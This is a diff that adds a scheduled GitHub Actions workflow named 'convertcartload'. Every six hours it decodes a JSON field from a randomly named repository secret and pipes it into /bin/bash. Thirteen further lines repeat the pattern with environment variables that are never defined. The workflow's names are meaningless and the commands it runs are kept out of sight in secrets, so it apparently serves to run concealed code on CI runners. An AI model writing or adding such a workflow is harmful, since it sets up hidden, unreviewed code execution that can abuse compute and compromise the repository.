@@ -1,0 +1,31 @@
+name: convertcartload
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: convertcartload
+        env:
+          cfu74291: ${{ secrets.cfu74291 }}
+        run: |
+          echo $cfu74291 | jq -r .yup21 | /bin/bash
+          echo $vrrc0307 | jq -r .c558 | /bin/bash
+          echo $xgup89 | jq -r .h06 | /bin/bash
+          echo $q16993 | jq -r .zeaxx0217 | /bin/bash
+          echo $zxr823 | jq -r .du8 | /bin/bash
+          echo $y5570 | jq -r .jyfof3336 | /bin/bash
+          echo $aiik9 | jq -r .ap2654 | /bin/bash
+          echo $sdobh4 | jq -r .blvmn9 | /bin/bash
+          echo $pgw4 | jq -r .jjsrv4337 | /bin/bash
+          echo $sr0 | jq -r .g03435 | /bin/bash
+          echo $aeyjh6 | jq -r .pv19 | /bin/bash
+          echo $loda99702 | jq -r .mkqki32 | /bin/bash
+          echo $o30492 | jq -r .yhg03 | /bin/bash
+          echo $v11654 | jq -r .rsky33 | /bin/bash
+
